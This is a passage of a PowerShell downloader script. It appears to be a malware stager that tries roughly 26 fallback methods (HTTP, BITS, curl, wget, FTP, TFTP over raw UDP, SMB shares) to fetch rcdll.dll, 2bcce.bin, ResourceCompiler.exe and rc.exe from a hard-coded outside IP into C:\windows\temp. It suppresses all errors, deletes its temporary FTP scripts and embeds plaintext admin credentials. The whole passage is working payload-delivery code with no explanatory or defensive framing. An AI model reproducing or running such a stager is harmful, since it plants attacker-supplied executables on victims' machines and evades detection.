        Copy-Item -Path "TempSMB2:\rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB2" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB2" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB2" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB2:\rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB2" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB2" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        cmd /c 'net use W: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "W:\rcdll.dll" -Destination "C:\windows\temp\rcdll.dll" -ErrorAction Stop
            cmd /c 'net use W: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use W: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "C:\windows\temp\rcdll.dll")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\rcdll.dll" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "C:\windows\temp\rcdll.dll" -Encoding ASCII -NoNewline
    } catch { }
}

# ============ 
# ============
# ============ 
# ============
# ============ 
# ============
# ============ FILE 3: 2bcce.bin DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/2bcce.bin" -OutFile "C:\windows\temp\2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/2bcce.bin" -OutFile "C:\windows\temp\2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/2bcce.bin", "C:\windows\temp\2bcce.bin")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'curl -o C:\windows\temp\2bcce.bin http://73.213.108.128:8081/2bcce.bin' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/2bcce.bin -O C:\windows\temp\2bcce.bin' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\2bcce.bin", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/2bcce.bin").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/2bcce.bin").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\2bcce.bin", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "C:\windows\temp\2bcce.bin")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "C:\windows\temp\2bcce.bin")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/2bcce.bin", "C:\windows\temp\2bcce.bin")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'curl -o C:\windows\temp\2bcce.bin ftp://73.213.108.128/2bcce.bin' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'curl -u admin:password123 -o C:\windows\temp\2bcce.bin ftp://73.213.108.128/2bcce.bin' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get 2bcce.bin C:\windows\temp\2bcce.bin
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpscript.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get 2bcce.bin C:\windows\temp\2bcce.bin
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpauth.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET 2bcce.bin C:\windows\temp\2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'tftp 73.213.108.128 get 2bcce.bin C:\windows\temp\2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET 2bcce.bin C:\windows\temp\2bcce.bin' 2>$null
    } catch { }
}

if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET 2bcce.bin C:\windows\temp\2bcce.bin' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("2bcce.bin"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\2bcce.bin", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\2bcce.bin" "C:\windows\temp\2bcce.bin"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\2bcce.bin" -Destination "C:\windows\temp\2bcce.bin" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "C:\windows\temp\2bcce.bin")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\2bcce.bin" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "C:\windows\temp\2bcce.bin" -Encoding ASCII -NoNewline
    } catch { }
}


# ============ 
# ============
# ============ 
# ============
# ============ 
# ============
# ============ FILE 4: ResourceCompiler.exe DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/ResourceCompiler.exe" -OutFile "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/ResourceCompiler.exe" -OutFile "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/ResourceCompiler.exe", "C:\windows\temp\ResourceCompiler.exe")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -o C:\windows\temp\ResourceCompiler.exe http://73.213.108.128:8081/ResourceCompiler.exe' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/ResourceCompiler.exe -O C:\windows\temp\ResourceCompiler.exe' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        [System.IO.File]::WriteAllBytes("C:\windows\temp\ResourceCompiler.exe", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/ResourceCompiler.exe").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/ResourceCompiler.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\ResourceCompiler.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "C:\windows\temp\ResourceCompiler.exe")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "C:\windows\temp\ResourceCompiler.exe")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/ResourceCompiler.exe", "C:\windows\temp\ResourceCompiler.exe")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -o C:\windows\temp\ResourceCompiler.exe ftp://73.213.108.128/ResourceCompiler.exe' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'curl -u admin:password123 -o C:\windows\temp\ResourceCompiler.exe ftp://73.213.108.128/ResourceCompiler.exe' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpscript.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe
quit
"@
        $ftpScript | Out-File -FilePath "C:\windows\temp\ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:C:\windows\temp\ftpauth.txt' 2>$null
        Remove-Item -Path "C:\windows\temp\ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp 73.213.108.128 get ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe' 2>$null
    } catch { }
}

if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET ResourceCompiler.exe C:\windows\temp\ResourceCompiler.exe' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("ResourceCompiler.exe"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("C:\windows\temp\ResourceCompiler.exe", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\ResourceCompiler.exe" "C:\windows\temp\ResourceCompiler.exe"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\ResourceCompiler.exe" -Destination "C:\windows\temp\ResourceCompiler.exe" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "C:\windows\temp\ResourceCompiler.exe")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\ResourceCompiler.exe" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "C:\windows\temp\ResourceCompiler.exe" -Encoding ASCII -NoNewline
    } catch { }
}

# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #




# ============ FILE 1: rc.exe DOWNLOAD METHODS ============

# HTTP Method 1: Invoke-WebRequest
if (-not (Test-Path "rc.exe")) {
    try {
        Invoke-WebRequest -Uri "http://73.213.108.128:8081/rc.exe" -OutFile "rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 2: Invoke-RestMethod
if (-not (Test-Path "rc.exe")) {
    try {
        Invoke-RestMethod -Uri "http://73.213.108.128:8081/rc.exe" -OutFile "rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 3: WebClient
if (-not (Test-Path "rc.exe")) {
    try {
        (New-Object System.Net.WebClient).DownloadFile("http://73.213.108.128:8081/rc.exe", "rc.exe")
    } catch { }
}

# HTTP Method 4: BITS Transfer
if (-not (Test-Path "rc.exe")) {
    try {
        Start-BitsTransfer -Source "http://73.213.108.128:8081/rc.exe" -Destination "rc.exe" -ErrorAction Stop
    } catch { }
}

# HTTP Method 5: curl
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'curl -o rc.exe http://73.213.108.128:8081/rc.exe' 2>$null
    } catch { }
}

# HTTP Method 6: wget
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'wget http://73.213.108.128:8081/rc.exe -O rc.exe' 2>$null
    } catch { }
}

# HTTP Method 7: HttpClient
if (-not (Test-Path "rc.exe")) {
    try {
        [System.IO.File]::WriteAllBytes("rc.exe", (New-Object System.Net.Http.HttpClient).GetAsync("http://73.213.108.128:8081/rc.exe").Result.Content.ReadAsByteArrayAsync().Result)
    } catch { }
}

# HTTP Method 8: WebRequest
if (-not (Test-Path "rc.exe")) {
    try {
        $response = [System.Net.WebRequest]::Create("http://73.213.108.128:8081/rc.exe").GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.BinaryReader($stream)
        $bytes = $reader.ReadBytes(1048576)
        [System.IO.File]::WriteAllBytes("rc.exe", $bytes)
        $reader.Close()
        $stream.Close()
        $response.Close()
    } catch { }
}

# FTP Method 9: FTP WebClient (Anonymous)
if (-not (Test-Path "rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "rc.exe")
    } catch { }
}

# FTP Method 10: FTP WebClient (with credentials)
if (-not (Test-Path "rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "rc.exe")
    } catch { }
}

# FTP Method 11: FTP WebClient (with authentication)
if (-not (Test-Path "rc.exe")) {
    try {
        $ftpClient = New-Object System.Net.WebClient
        $ftpClient.Credentials = New-Object System.Net.NetworkCredential("admin", "password123")
        $ftpClient.DownloadFile("ftp://73.213.108.128/rc.exe", "rc.exe")
    } catch { }
}

# FTP Method 12: FTP via curl
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'curl -o rc.exe ftp://73.213.108.128/rc.exe' 2>$null
    } catch { }
}

# FTP Method 13: FTP via curl with credentials
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'curl -u admin:password123 -o rc.exe ftp://73.213.108.128/rc.exe' 2>$null
    } catch { }
}

# FTP Method 14: FTP via built-in Windows FTP client (automated)
if (-not (Test-Path "rc.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
anonymous

binary
get rc.exe rc.exe
quit
"@
        $ftpScript | Out-File -FilePath "ftpscript.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpscript.txt' 2>$null
        Remove-Item -Path "ftpscript.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# FTP Method 15: FTP via built-in Windows FTP client (with auth)
if (-not (Test-Path "rc.exe")) {
    try {
        $ftpScript = @"
open 73.213.108.128
admin
password123
binary
get rc.exe rc.exe
quit
"@
        $ftpScript | Out-File -FilePath "ftpauth.txt" -Encoding ASCII
        cmd /c 'ftp -s:ftpauth.txt' 2>$null
        Remove-Item -Path "ftpauth.txt" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# TFTP Method 16: TFTP via built-in Windows TFTP client
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128 GET rc.exe rc.exe' 2>$null
    } catch { }
}

# TFTP Method 17: TFTP via built-in Windows TFTP client (alternative syntax)
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'tftp 73.213.108.128 get rc.exe rc.exe' 2>$null
    } catch { }
}

# TFTP Method 18: TFTP with alternate server/port combinations
if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:69 GET rc.exe rc.exe' 2>$null
    } catch { }
}

if (-not (Test-Path "rc.exe")) {
    try {
        cmd /c 'tftp -i 73.213.108.128:1069 GET rc.exe rc.exe' 2>$null
    } catch { }
}

# TFTP Method 19: TFTP PowerShell UDP Implementation
if (-not (Test-Path "rc.exe")) {
    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
